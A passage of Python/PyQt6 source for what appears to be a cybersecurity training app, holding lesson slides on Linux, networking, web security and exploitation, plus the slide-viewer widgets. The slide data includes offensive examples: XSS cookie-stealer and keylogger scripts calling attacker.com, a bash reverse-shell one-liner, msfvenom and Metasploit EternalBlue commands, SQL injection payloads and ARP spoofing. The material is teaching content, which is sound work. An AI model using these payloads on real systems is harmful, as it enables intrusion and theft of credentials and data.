"""
Lesson View - Interactive slideshow for each learning module
Opens as a full-screen-style overlay within the app window.
"""

from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel,
                              QPushButton, QFrame, QScrollArea, QGraphicsOpacityEffect,
                              QSizePolicy, QProgressBar)
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, pyqtSignal, QRect
from PyQt6.QtGui import QFont, QColor, QPalette, QLinearGradient, QPainter, QPen, QBrush


# ---------------------------------------------------------------------------
# Lesson content data
# ---------------------------------------------------------------------------

LESSON_CONTENT = {
    'linux-basics': {
        'title': 'Linux Basics',
        'icon': '🐧',
        'color': '#10b981',
        'slides': [
            {
                'title': 'Welcome to Linux',
                'type': 'intro',
                'content': 'Linux is the backbone of cybersecurity. Nearly every server, embedded device, and hacking tool runs on it. Mastering Linux means mastering your environment.',
                'bullets': [
                    '🌍  Powers 96% of the world\'s top web servers',
                    '🔓  Open-source — you can read and modify every line',
                    '🛠️  Tools like Kali Linux are built specifically for security',
                    '💪  The terminal gives you direct, unrestricted control',
                ],
                'code': None,
            },
            {
                'title': 'Filesystem & Navigation',
                'type': 'lesson',
                'content': 'Everything in Linux is a file — including devices, processes, and network sockets. The filesystem starts at / (root) and branches out.',
                'bullets': [
                    '/home  — User home directories',
                    '/etc   — System configuration files',
                    '/var   — Logs and variable data',
                    '/tmp   — Temporary files (world-writable!)',
                    '/proc  — Virtual filesystem for processes',
                ],
                'code': '$ pwd\n/home/kali\n\n$ ls -la\ntotal 48\ndrwxr-xr-x  7 kali kali 4096 Apr  6 01:00 .\ndrwxr-xr-x 18 root root 4096 Apr  6 00:00 ..\n-rw-r--r--  1 kali kali  220 Apr  6 00:00 .bashrc\n\n$ cd /etc && ls\npasswd  shadow  hosts  cron.d  ssh/',
            },
            {
                'title': 'File Permissions',
                'type': 'lesson',
                'content': 'Permissions control who can read, write, or execute a file. Understanding them is critical — misconfigurations are a leading cause of privilege escalation.',
                'bullets': [
                    'r (4) = Read    — view file contents',
                    'w (2) = Write   — modify file contents',
                    'x (1) = Execute — run as a program',
                    'Three groups: Owner | Group | Others',
                    'SUID bit (chmod +s) — runs as the file owner!',
                ],
                'code': '$ ls -l /usr/bin/passwd\n-rwsr-xr-x 1 root root 59976 passwd\n        ↑\n   SUID bit set! Runs as root.\n\n$ chmod 755 script.sh   # rwxr-xr-x\n$ chmod 600 secret.txt  # rw-------\n$ find / -perm -4000 2>/dev/null  # find SUID files',
            },
            {
                'title': 'Processes & Jobs',
                'type': 'lesson',
                'content': 'Every running program is a process with a unique PID. Monitoring and controlling processes is essential for both administration and exploitation.',
                'bullets': [
                    'ps aux         — list all running processes',
                    'top / htop     — live process monitor',
                    'kill -9 <PID>  — force-terminate a process',
                    'Ctrl+Z         — suspend to background',
                    'jobs / fg / bg — manage background jobs',
                ],
                'code': '$ ps aux | grep apache\nroot  1234  0.0  0.1  apache2 -k start\n\n$ top\n  PID USER    %CPU %MEM COMMAND\n 1234 root     0.1  1.2 apache2\n\n$ kill -9 1234\n$ nohup ./script.sh &  # run after logout',
            },
            {
                'title': 'Shell Scripting Basics',
                'type': 'lesson',
                'content': 'Shell scripts automate repetitive tasks. In security, scripts power everything from recon automation to exploit chains.',
                'bullets': [
                    'Shebang line: #!/bin/bash tells the OS which interpreter to use',
                    'Variables: NAME="value"  (no spaces around =)',
                    'Loops: for, while — iterate over targets',
                    'Conditionals: if/elif/else — branch on results',
                    'Pipe (|) and redirect (> >>) — chain commands',
                ],
                'code': '#!/bin/bash\n# Quick port scanner\nTARGET="192.168.1.1"\n\nfor PORT in 22 80 443 8080; do\n    if nc -z -w1 $TARGET $PORT 2>/dev/null; then\n        echo "[OPEN]   $TARGET:$PORT"\n    else\n        echo "[closed] $TARGET:$PORT"\n    fi\ndone',
            },
            {
                'title': 'Knowledge Check',
                'type': 'quiz',
                'question': 'A file has permissions -rwsr-xr-x and is owned by root. What does this mean?',
                'options': [
                    ('A', 'Only root can run it', False),
                    ('B', 'Anyone who runs it gets root privileges temporarily (SUID)', True),
                    ('C', 'The file is read-only for everyone', False),
                    ('D', 'The group can write to it', False),
                ],
                'explanation': 'The "s" in the owner execute position is the SUID (Set User ID) bit. When any user runs this file, it executes with the file owner\'s privileges — in this case, root. This is how /usr/bin/passwd works, and why finding SUID files is an important privilege escalation technique.',
            },
        ],
    },

    'network-security': {
        'title': 'Network Security',
        'icon': '🌐',
        'color': '#3b82f6',
        'slides': [
            {
                'title': 'The Network is Your Battlefield',
                'type': 'intro',
                'content': 'Every attack and defense happens over a network. Understanding how data flows — and where it can be intercepted, blocked, or hijacked — is the foundation of offensive and defensive security.',
                'bullets': [
                    '📡  All network communication can potentially be intercepted',
                    '🔍  Packet analysis reveals exactly what\'s being transmitted',
                    '🗺️  Network mapping shows the attack surface',
                    '⚡  Attacks happen at every layer of the stack',
                ],
                'code': None,
            },
            {
                'title': 'The TCP/IP Model',
                'type': 'lesson',
                'content': 'The TCP/IP model describes how data is packaged, addressed, transmitted, and received. Each layer adds a header wrapping the data — this is called encapsulation.',
                'bullets': [
                    'Layer 4 — Application  (HTTP, SSH, DNS, FTP)',
                    'Layer 3 — Transport    (TCP, UDP — ports live here)',
                    'Layer 2 — Internet     (IP addresses, routing)',
                    'Layer 1 — Link         (MAC addresses, Ethernet, Wi-Fi)',
                    'Attacks target specific layers: ARP spoofing (L1), IP spoofing (L2), SYN flood (L3)',
                ],
                'code': '# TCP Three-Way Handshake:\n\nClient ──── SYN ────────► Server\nClient ◄─── SYN-ACK ────── Server\nClient ──── ACK ────────► Server\n# Connection established!\n\n# SYN Flood attack: send thousands of SYNs,\n# never complete the handshake — server runs\n# out of half-open connection slots.',
            },
            {
                'title': 'Wireshark & Packet Analysis',
                'type': 'lesson',
                'content': 'Wireshark captures every packet on a network interface. In a pentest, running Wireshark on a compromised machine can reveal credentials, session tokens, and internal communications.',
                'bullets': [
                    'Promiscuous mode — capture ALL packets, not just yours',
                    'Display filters — narrow down to what matters',
                    'Follow TCP Stream — reassemble full conversations',
                    'Export objects — extract files from HTTP/SMB traffic',
                    'Credentials often visible in clear-text protocols (HTTP, FTP, Telnet)',
                ],
                'code': '# Useful Wireshark display filters:\n\nhttp                    # all HTTP traffic\nhttp.request.method == "POST"  # form submissions\nftp-data                # FTP file transfers\nsmb                     # Windows file sharing\ndns                     # DNS queries (recon gold)\ntcp.port == 22          # SSH traffic\nip.addr == 192.168.1.50 # specific host\ncontains "password"     # keyword search',
            },
            {
                'title': 'Nmap Scanning',
                'type': 'lesson',
                'content': 'Nmap is the industry-standard network scanner. It discovers hosts, open ports, running services, and even operating system fingerprints.',
                'bullets': [
                    '-sS  SYN stealth scan (half-open, less likely to be logged)',
                    '-sV  Service version detection',
                    '-O   OS fingerprinting',
                    '-A   Aggressive: OS + version + scripts + traceroute',
                    '-p-  Scan all 65535 ports (thorough but slow)',
                ],
                'code': '# Host discovery\nnmap -sn 192.168.1.0/24\n\n# Quick scan of common ports\nnmap -T4 192.168.1.100\n\n# Full recon scan\nnmap -A -p- 192.168.1.100 -oN scan.txt\n\n# Example output:\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4\n80/tcp open  http    Apache 2.4.51\n  |_http-title: Company Intranet',
            },
            {
                'title': 'Common Network Attacks',
                'type': 'lesson',
                'content': 'Understanding how attacks work is the first step to defending against them — and finding them in penetration tests.',
                'bullets': [
                    'ARP Spoofing — poison ARP cache to become the "gateway" (MITM)',
                    'DNS Poisoning — redirect domains to attacker-controlled IPs',
                    'Man-in-the-Middle — intercept & modify traffic between two parties',
                    'Port Scanning — not an attack itself, but essential recon',
                    'Credential Sniffing — capture logins over unencrypted protocols',
                ],
                'code': '# ARP Spoofing with arpspoof:\narpspoof -i eth0 -t 192.168.1.50 192.168.1.1\n# Tells .50 that WE are the gateway (.1)\n\n# Enable IP forwarding so traffic still flows:\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Now run Wireshark — all of .50\'s\n# traffic flows through us!',
            },
            {
                'title': 'Knowledge Check',
                'type': 'quiz',
                'question': 'You capture traffic and see hundreds of SYN packets going to port 80, with no corresponding ACK completions. What is most likely happening?',
                'options': [
                    ('A', 'Normal web browsing traffic', False),
                    ('B', 'A SYN Flood DoS attack against the web server', True),
                    ('C', 'An SSH brute force attack', False),
                    ('D', 'DNS enumeration', False),
                ],
                'explanation': 'A SYN Flood is a Denial-of-Service attack where the attacker sends many SYN packets but never completes the three-way handshake. The server allocates resources for each half-open connection, eventually exhausting its connection table. The pattern of SYNs with no ACK replies is the telltale sign.',
            },
        ],
    },

    'web-security': {
        'title': 'Web Security',
        'icon': '🕸️',
        'color': '#f59e0b',
        'slides': [
            {
                'title': 'The Web: A Giant Attack Surface',
                'type': 'intro',
                'content': 'Web applications are the most common attack target. They\'re internet-facing, often poorly tested, and process untrusted user input constantly. The OWASP Top 10 catalogues the most critical risks.',
                'bullets': [
                    '🌐  Web apps are accessible to anyone on the internet',
                    '💉  They accept user input — which can be weaponized',
                    '🔐  Authentication and session management are complex to get right',
                    '📋  OWASP Top 10 is the industry standard vulnerability reference',
                ],
                'code': None,
            },
            {
                'title': 'OWASP Top 10 Overview',
                'type': 'lesson',
                'content': 'The OWASP Top 10 represents the most critical web application security risks, ranked by prevalence and impact.',
                'bullets': [
                    'A01 — Broken Access Control  (most common!)',
                    'A02 — Cryptographic Failures  (sensitive data exposure)',
                    'A03 — Injection  (SQLi, command injection, XSS)',
                    'A04 — Insecure Design  (logic flaws)',
                    'A05 — Security Misconfiguration  (default creds, open directories)',
                    'A06 — Vulnerable Components  (outdated libraries)',
                    'A07 — Authentication Failures  (weak passwords, no MFA)',
                ],
                'code': '# Quick misconfiguration checks:\n\ncurl -I https://target.com\n# Look for: Server: Apache/2.2.17 (outdated!)\n# Missing: X-Frame-Options, Content-Security-Policy\n\n# Test default credentials:\ncurl -u admin:admin https://target.com/admin\ncurl -u admin:password https://target.com/login\n\n# Check for directory listing:\ncurl https://target.com/uploads/',
            },
            {
                'title': 'SQL Injection',
                'type': 'lesson',
                'content': 'SQL Injection occurs when user input is inserted directly into a database query without sanitization. An attacker can manipulate the query to dump data, bypass auth, or execute OS commands.',
                'bullets': [
                    'Classic SQLi  — manipulate WHERE clauses',
                    'UNION attack  — append a second SELECT to extract data',
                    'Blind SQLi    — infer data from true/false responses',
                    'Time-based    — use SLEEP() to confirm injection',
                    'Prevention: parameterized queries / prepared statements ALWAYS',
                ],
                'code': '# Vulnerable PHP:\n$q = "SELECT * FROM users WHERE user=\'$_GET[u]\'";\n\n# Attack payload:\n?u=admin\'--\n# Query becomes: WHERE user=\'admin\'--\'\n# Everything after -- is a comment → bypass!\n\n# UNION extraction:\n?u=\' UNION SELECT username,password FROM users--\n\n# SQLmap (automated):\nsqlmap -u "http://target/page?id=1" --dbs',
            },
            {
                'title': 'Cross-Site Scripting (XSS)',
                'type': 'lesson',
                'content': 'XSS injects malicious JavaScript into web pages viewed by other users. The attacker\'s script runs in the victim\'s browser with access to their session cookies, keystrokes, and DOM.',
                'bullets': [
                    'Reflected XSS  — payload in the URL, one victim at a time',
                    'Stored XSS     — payload saved in DB, hits every visitor (dangerous!)',
                    'DOM-based XSS  — manipulates client-side JavaScript',
                    'Cookie theft   — document.cookie sent to attacker',
                    'Prevention: output encoding, Content-Security-Policy header',
                ],
                'code': '<!-- Reflected XSS test: -->\n<script>alert(1)</script>\n\n<!-- Cookie stealer payload: -->\n<script>\n  new Image().src="http://attacker.com/log?c="\n    + document.cookie;\n</script>\n\n<!-- Keylogger: -->\n<script>\n  document.onkeypress = (e) => {\n    fetch("http://attacker.com/?k=" + e.key);\n  }\n</script>',
            },
            {
                'title': 'Burp Suite Basics',
                'type': 'lesson',
                'content': 'Burp Suite is the essential web security testing tool. It acts as a proxy between your browser and the target, letting you intercept, modify, and replay every request.',
                'bullets': [
                    'Proxy — intercept and modify requests/responses in real time',
                    'Repeater — resend modified requests, test payloads manually',
                    'Intruder — automated fuzzing and brute force attacks',
                    'Scanner — automated vulnerability detection (Pro)',
                    'Decoder — encode/decode Base64, URL, HTML entities',
                ],
                'code': '# Workflow:\n1. Set browser proxy → 127.0.0.1:8080\n2. Browse target — requests appear in Proxy > Intercept\n3. Send interesting request to Repeater (Ctrl+R)\n4. Modify parameters and resend\n5. Test SQLi: change id=1 to id=1\'\n6. Test XSS: change name=test to name=<script>alert(1)</script>\n\n# Useful Burp tricks:\n- Right-click → Send to Intruder for fuzzing\n- Engagement Tools → Find comments in source\n- Target → Site map for full inventory',
            },
            {
                'title': 'Knowledge Check',
                'type': 'quiz',
                'question': 'A login form sends: POST /login with body username=admin&password=test. You change it to username=admin\'--&password=anything. You\'re now logged in. What vulnerability is this?',
                'options': [
                    ('A', 'Cross-Site Scripting (XSS)', False),
                    ('B', 'SQL Injection bypassing authentication', True),
                    ('C', 'CSRF attack', False),
                    ('D', 'Path traversal', False),
                ],
                'explanation': 'This is a classic SQL Injection authentication bypass. The single quote closes the username string in the SQL query, and -- comments out the rest (including the password check). The query becomes: SELECT * FROM users WHERE username=\'admin\'-- which returns the admin user without checking the password.',
            },
        ],
    },

    'exploitation': {
        'title': 'Exploitation Techniques',
        'icon': '⚔️',
        'color': '#ef4444',
        'slides': [
            {
                'title': 'From Vulnerability to Access',
                'type': 'intro',
                'content': 'Exploitation is the art of turning a discovered vulnerability into actual system access. This module covers the full offensive lifecycle — finding, weaponizing, and leveraging vulnerabilities.',
                'bullets': [
                    '🔍  Vulnerability Research — find the weakness',
                    '💣  Weaponization — turn it into a working exploit',
                    '🚀  Delivery — get the exploit to execute',
                    '🏴  Post-Exploitation — maintain access, escalate, pivot',
                ],
                'code': None,
            },
            {
                'title': 'Vulnerability Research',
                'type': 'lesson',
                'content': 'Before exploiting anything, you need to identify what\'s vulnerable. Vulnerability research combines scanning, version fingerprinting, and database lookups.',
                'bullets': [
                    'CVE — Common Vulnerabilities and Exposures (unique IDs)',
                    'NVD — National Vulnerability Database (cvss scores)',
                    'Exploit-DB — public exploit archive (searchsploit CLI)',
                    'Shodan — search engine for internet-exposed devices',
                    'CVSS Score — 0-10 severity rating (9+ = Critical)',
                ],
                'code': '# Find exploits for a service version:\nsearchsploit apache 2.4.49\n\n# Output:\nApache HTTP Server 2.4.49 - Path Traversal\nApache HTTP Server 2.4.49 - Remote Code Execution\n\n# Copy exploit to working directory:\nsearchsploit -m 50383\n\n# Check CVE details:\ncurl https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
            },
            {
                'title': 'Metasploit Framework',
                'type': 'lesson',
                'content': 'Metasploit is the most powerful exploitation framework in existence. It contains hundreds of ready-to-use exploits, payloads, and post-exploitation modules.',
                'bullets': [
                    'Exploit modules — attack the vulnerability',
                    'Payload modules — what executes after exploitation (reverse shell, meterpreter)',
                    'Auxiliary modules — scanning, fuzzing, credential testing',
                    'Post modules — post-exploitation (dump hashes, pivot)',
                    'msfvenom — standalone payload generator',
                ],
                'code': '# Start Metasploit:\nmsfconsole\n\n# Search for an exploit:\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\n\n# Configure it:\nmsf> set RHOSTS 192.168.1.100\nmsf> set LHOST 192.168.1.50\nmsf> set payload windows/x64/meterpreter/reverse_tcp\n\n# Launch:\nmsf> exploit\n[*] Meterpreter session 1 opened!',
            },
            {
                'title': 'Payloads & Listeners',
                'type': 'lesson',
                'content': 'A payload is code that runs on the target after exploitation. The most common are reverse shells — the target connects back to the attacker, bypassing firewalls.',
                'bullets': [
                    'Reverse Shell — target connects OUT to attacker (bypasses inbound firewall)',
                    'Bind Shell — attacker connects IN to target (needs open port)',
                    'Meterpreter — advanced in-memory payload (no disk artifacts)',
                    'Staged vs Stageless — staged downloads payload in parts (smaller initial size)',
                    'msfvenom generates payloads in any format: .exe, .php, .py, .sh',
                ],
                'code': '# Generate a Windows reverse shell:\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=192.168.1.50 LPORT=4444 \\\n  -f exe -o shell.exe\n\n# Start a listener:\nnc -lvnp 4444\n# OR in Metasploit:\nuse multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LHOST 192.168.1.50\nexploit -j\n\n# Bash one-liner reverse shell:\nbash -i >& /dev/tcp/192.168.1.50/4444 0>&1',
            },
            {
                'title': 'Post-Exploitation',
                'type': 'lesson',
                'content': 'Getting a shell is just the beginning. Post-exploitation covers maintaining access, escalating privileges, looting data, and pivoting deeper into the network.',
                'bullets': [
                    'Privilege Escalation — from user to admin/root',
                    'Persistence — survive reboots (cron jobs, registry run keys)',
                    'Credential Dumping — harvest passwords and hashes (Mimikatz)',
                    'Lateral Movement — pivot to other machines on the network',
                    'Covering Tracks — clear logs, remove artifacts',
                ],
                'code': '# Meterpreter post-exploitation:\nmeterpreter> getuid       # who am I?\nmeterpreter> getsystem    # attempt privilege escalation\nmeterpreter> hashdump     # dump password hashes\nmeterpreter> run post/multi/recon/local_exploit_suggester\n\n# Linux privilege escalation:\nfind / -perm -4000 2>/dev/null  # SUID files\nsudo -l                         # what can we sudo?\ncat /etc/crontab                # scheduled tasks running as root\nls -la /etc/passwd              # writable? game over.',
            },
            {
                'title': 'Knowledge Check',
                'type': 'quiz',
                'question': 'You\'ve exploited a web server and have a shell as www-data. You run "sudo -l" and see: www-data may run /usr/bin/python3 as root. How do you escalate to root?',
                'options': [
                    ('A', 'You can\'t — you need a different exploit', False),
                    ('B', 'sudo python3 -c "import os; os.system(\'/bin/bash\')"', True),
                    ('C', 'Run sudo su and enter www-data\'s password', False),
                    ('D', 'Wait for a cron job to run as root', False),
                ],
                'explanation': 'Since www-data can run python3 as root without a password, you can use Python to spawn a shell that inherits root\'s privileges. The -c flag passes a Python command directly: os.system(\'/bin/bash\') spawns a bash shell. This is a classic "GTFOBins" technique — check gtfobins.github.io for privilege escalation via common binaries.',
            },
        ],
    },
}


# ---------------------------------------------------------------------------
# Slide widgets
# ---------------------------------------------------------------------------

class IntroSlide(QWidget):
    def __init__(self, slide_data, accent_color, parent=None):
        super().__init__(parent)
        self.slide_data = slide_data
        self.accent_color = accent_color
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(60, 40, 60, 40)
        layout.setSpacing(24)
        layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        # Big icon + title
        title_label = QLabel(self.slide_data['title'])
        title_label.setFont(QFont('Georgia', 34, QFont.Weight.Bold))
        title_label.setStyleSheet(f"color: {self.accent_color}; background: transparent;")
        title_label.setWordWrap(True)
        layout.addWidget(title_label)

        # Divider line
        line = QFrame()
        line.setFixedHeight(3)
        line.setStyleSheet(f"background: {self.accent_color}; border-radius: 2px;")
        layout.addWidget(line)

        # Content paragraph
        content = QLabel(self.slide_data['content'])
        content.setFont(QFont('Georgia', 14))
        content.setStyleSheet("color: #cbd5e1; background: transparent; line-height: 1.6;")
        content.setWordWrap(True)
        layout.addWidget(content)

        layout.addSpacing(12)

        # Bullets
        for bullet in self.slide_data.get('bullets', []):
            row = QHBoxLayout()
            row.setContentsMargins(0, 0, 0, 0)
            row.setSpacing(0)

            b = QLabel(bullet)
            b.setFont(QFont('Consolas', 12))
            b.setStyleSheet(f"color: #e2e8f0; background: transparent; padding: 6px 16px;"
                            f"border-left: 3px solid {self.accent_color}; margin-bottom: 4px;")
            b.setWordWrap(True)
            row.addWidget(b)
            layout.addLayout(row)

        layout.addStretch()


class LessonSlide(QWidget):
    def __init__(self, slide_data, accent_color, parent=None):
        super().__init__(parent)
        self.slide_data = slide_data
        self.accent_color = accent_color
        self._setup_ui()

    def _setup_ui(self):
        layout = QHBoxLayout(self)
        layout.setContentsMargins(40, 30, 40, 30)
        layout.setSpacing(30)

        # --- Left column ---
        left = QVBoxLayout()
        left.setSpacing(16)
        left.setAlignment(Qt.AlignmentFlag.AlignTop)

        title = QLabel(self.slide_data['title'])
        title.setFont(QFont('Georgia', 24, QFont.Weight.Bold))
        title.setStyleSheet(f"color: {self.accent_color}; background: transparent;")
        title.setWordWrap(True)
        left.addWidget(title)

        content = QLabel(self.slide_data['content'])
        content.setFont(QFont('Georgia', 12))
        content.setStyleSheet("color: #94a3b8; background: transparent;")
        content.setWordWrap(True)
        left.addWidget(content)

        left.addSpacing(8)

        for bullet in self.slide_data.get('bullets', []):
            b = QLabel(f"▸  {bullet}")
            b.setFont(QFont('Consolas', 11))
            b.setStyleSheet("color: #e2e8f0; background: transparent; padding: 3px 0px;")
            b.setWordWrap(True)
            left.addWidget(b)

        left.addStretch()
        layout.addLayout(left, stretch=1)

        # --- Right column: code block ---
        if self.slide_data.get('code'):
            right = QVBoxLayout()
            right.setAlignment(Qt.AlignmentFlag.AlignTop)

            code_label = QLabel("💻  Code / Example")
            code_label.setFont(QFont('Consolas', 9, QFont.Weight.Bold))
            code_label.setStyleSheet(f"color: {self.accent_color}; background: transparent;")
            right.addWidget(code_label)

            code_frame = QFrame()
            code_frame.setStyleSheet("""
                QFrame {
                    background-color: #0d1117;
                    border-radius: 8px;
                    border: 1px solid #30363d;
                }
            """)
            code_layout = QVBoxLayout(code_frame)
            code_layout.setContentsMargins(20, 16, 20, 16)

            code_text = QLabel(self.slide_data['code'])
            code_text.setFont(QFont('Consolas', 10))
            code_text.setStyleSheet("color: #c9d1d9; background: transparent;")
            code_text.setWordWrap(False)
            code_text.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
            code_layout.addWidget(code_text)

            right.addWidget(code_frame, stretch=1)
            right.addStretch()
            layout.addLayout(right, stretch=1)


class QuizSlide(QWidget):
    answered = pyqtSignal(bool)  # emits True if correct

    def __init__(self, slide_data, accent_color, parent=None):
        super().__init__(parent)
        self.slide_data = slide_data
        self.accent_color = accent_color
        self._answered = False
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(60, 40, 60, 40)
        layout.setSpacing(20)
        layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        title = QLabel("🧠  Knowledge Check")
        title.setFont(QFont('Georgia', 22, QFont.Weight.Bold))
        title.setStyleSheet(f"color: {self.accent_color}; background: transparent;")
        layout.addWidget(title)

        question = QLabel(self.slide_data['question'])
        question.setFont(QFont('Georgia', 14))
        question.setStyleSheet("color: #f1f5f9; background: transparent;")
        question.setWordWrap(True)
        layout.addWidget(question)

        layout.addSpacing(8)

        self._option_buttons = []
        for letter, text, correct in self.slide_data['options']:
            btn = QPushButton(f"  {letter}.  {text}")
            btn.setFont(QFont('Consolas', 12))
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: #1e293b;
                    color: #e2e8f0;
                    border: 2px solid #334155;
                    border-radius: 8px;
                    padding: 14px 20px;
                    text-align: left;
                }}
                QPushButton:hover {{
                    border-color: {self.accent_color};
                    background-color: #253449;
                }}
            """)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.clicked.connect(lambda checked, c=correct, b=btn: self._on_answer(c, b))
            btn.setProperty('correct', correct)
            self._option_buttons.append(btn)
            layout.addWidget(btn)

        self._explanation = QLabel()
        self._explanation.setFont(QFont('Georgia', 11))
        self._explanation.setStyleSheet("color: #94a3b8; background: transparent; padding: 12px;")
        self._explanation.setWordWrap(True)
        self._explanation.hide()
        layout.addWidget(self._explanation)

        layout.addStretch()

    def _on_answer(self, correct, clicked_btn):
        if self._answered:
            return
        self._answered = True

        for btn in self._option_buttons:
            btn.setEnabled(False)
            if btn.property('correct'):
                btn.setStyleSheet(f"""
                    QPushButton {{
                        background-color: #064e3b;
                        color: #6ee7b7;
                        border: 2px solid #10b981;
                        border-radius: 8px;
                        padding: 14px 20px;
                        text-align: left;
                    }}
                """)
            elif btn == clicked_btn and not correct:
                btn.setStyleSheet(f"""
                    QPushButton {{
                        background-color: #450a0a;
                        color: #fca5a5;
                        border: 2px solid #ef4444;
                        border-radius: 8px;
                        padding: 14px 20px;
                        text-align: left;
                    }}
                """)

        icon = "✅" if correct else "❌"
        result = "Correct!" if correct else "Not quite."
        self._explanation.setText(
            f"{icon}  {result}\n\n{self.slide_data['explanation']}"
        )
        self._explanation.show()
        self.answered.emit(correct)


# ---------------------------------------------------------------------------
# Main Lesson Window
# ---------------------------------------------------------------------------

class LessonWindow(QWidget):
    closed = pyqtSignal()

    def __init__(self, module_id, parent=None):
        super().__init__(parent)
        self.module_id = module_id
        self.lesson = LESSON_CONTENT.get(module_id, {})
        self.slides = self.lesson.get('slides', [])
        self.accent = self.lesson.get('color', '#3b82f6')
        self.current_index = 0

        self.setWindowFlags(Qt.WindowType.Window)
        self.setMinimumSize(1100, 720)
        self.setWindowTitle(f"📖  {self.lesson.get('title', 'Lesson')}")
        self.setStyleSheet("background-color: #0f172a;")

        self._build_ui()
        self._show_slide(0)

    # ------------------------------------------------------------------
    # UI Construction
    # ------------------------------------------------------------------

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── Header bar ──────────────────────────────────────────────
        header = QFrame()
        header.setFixedHeight(60)
        header.setStyleSheet(f"""
            QFrame {{
                background-color: #1e293b;
                border-bottom: 2px solid {self.accent};
            }}
        """)
        h_layout = QHBoxLayout(header)
        h_layout.setContentsMargins(24, 0, 24, 0)

        icon_title = QLabel(f"{self.lesson.get('icon', '')}  {self.lesson.get('title', '')}")
        icon_title.setFont(QFont('Georgia', 16, QFont.Weight.Bold))
        icon_title.setStyleSheet(f"color: {self.accent}; background: transparent;")
        h_layout.addWidget(icon_title)

        h_layout.addStretch()

        self._slide_counter = QLabel()
        self._slide_counter.setFont(QFont('Consolas', 11))
        self._slide_counter.setStyleSheet("color: #64748b; background: transparent;")
        h_layout.addWidget(self._slide_counter)

        close_btn = QPushButton("✕  Close")
        close_btn.setFont(QFont('Consolas', 10))
        close_btn.setStyleSheet("""
            QPushButton {
                background: #334155;
                color: #94a3b8;
                border: none;
                border-radius: 6px;
                padding: 6px 16px;
            }
            QPushButton:hover { background: #475569; color: #f1f5f9; }
        """)
        close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        close_btn.clicked.connect(self._on_close)
        h_layout.addWidget(close_btn)

        root.addWidget(header)

        # ── Progress bar ────────────────────────────────────────────
        self._progress = QProgressBar()
        self._progress.setFixedHeight(4)
        self._progress.setTextVisible(False)
        self._progress.setStyleSheet(f"""
            QProgressBar {{
                background: #1e293b;
                border: none;
            }}
            QProgressBar::chunk {{
                background: {self.accent};
                border-radius: 2px;
            }}
        """)
        self._progress.setMaximum(max(len(self.slides) - 1, 1))
        root.addWidget(self._progress)

        # ── Slide area ──────────────────────────────────────────────
        self._slide_area = QScrollArea()
        self._slide_area.setWidgetResizable(True)
        self._slide_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self._slide_area.setStyleSheet("""
            QScrollArea { border: none; background: transparent; }
            QScrollBar:vertical { background: #1e293b; width: 8px; }
            QScrollBar::handle:vertical { background: #334155; border-radius: 4px; }
        """)
        root.addWidget(self._slide_area, stretch=1)

        # ── Footer nav ──────────────────────────────────────────────
        footer = QFrame()
        footer.setFixedHeight(68)
        footer.setStyleSheet("background-color: #1e293b; border-top: 1px solid #334155;")
        f_layout = QHBoxLayout(footer)
        f_layout.setContentsMargins(30, 0, 30, 0)
        f_layout.setSpacing(12)

        self._prev_btn = QPushButton("◀  Previous")
        self._prev_btn.setFont(QFont('Consolas', 11))
        self._prev_btn.setFixedHeight(40)
        self._prev_btn.setMinimumWidth(140)
        self._prev_btn.setStyleSheet(f"""
            QPushButton {{
                background: #334155;
                color: #94a3b8;
                border: none;
                border-radius: 8px;
                padding: 0 20px;
            }}
            QPushButton:hover {{ background: #475569; color: #f1f5f9; }}
            QPushButton:disabled {{ background: #1e293b; color: #334155; }}
        """)
        self._prev_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self._prev_btn.clicked.connect(self._prev_slide)
        f_layout.addWidget(self._prev_btn)

        # Dot indicators
        self._dots_layout = QHBoxLayout()
        self._dots_layout.setSpacing(8)
        self._dots = []
        for i in range(len(self.slides)):
            dot = QLabel("●")
            dot.setFont(QFont('Arial', 8))
            dot.setStyleSheet("color: #334155; background: transparent;")
            self._dots.append(dot)
            self._dots_layout.addWidget(dot)
        f_layout.addLayout(self._dots_layout)

        f_layout.addStretch()

        self._next_btn = QPushButton("Next  ▶")
        self._next_btn.setFont(QFont('Consolas', 11, QFont.Weight.Bold))
        self._next_btn.setFixedHeight(40)
        self._next_btn.setMinimumWidth(140)
        self._next_btn.setStyleSheet(f"""
            QPushButton {{
                background: {self.accent};
                color: white;
                border: none;
                border-radius: 8px;
                padding: 0 20px;
            }}
            QPushButton:hover {{ opacity: 0.9; }}
            QPushButton:disabled {{ background: #1e293b; color: #334155; }}
        """)
        self._next_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self._next_btn.clicked.connect(self._next_slide)
        f_layout.addWidget(self._next_btn)

        root.addWidget(footer)

    # ------------------------------------------------------------------
    # Navigation
    # ------------------------------------------------------------------

    def _show_slide(self, index):
        if index < 0 or index >= len(self.slides):
            return

        self.current_index = index
        slide_data = self.slides[index]

        # Build appropriate widget
        slide_type = slide_data.get('type', 'lesson')
        if slide_type == 'intro':
            widget = IntroSlide(slide_data, self.accent)
        elif slide_type == 'quiz':
            widget = QuizSlide(slide_data, self.accent)
        else:
            widget = LessonSlide(slide_data, self.accent)

        widget.setStyleSheet("background: transparent;")
        self._slide_area.setWidget(widget)

        # Update UI state
        self._slide_counter.setText(f"Slide {index + 1} of {len(self.slides)}")
        self._progress.setValue(index)

        self._prev_btn.setEnabled(index > 0)
        is_last = (index == len(self.slides) - 1)
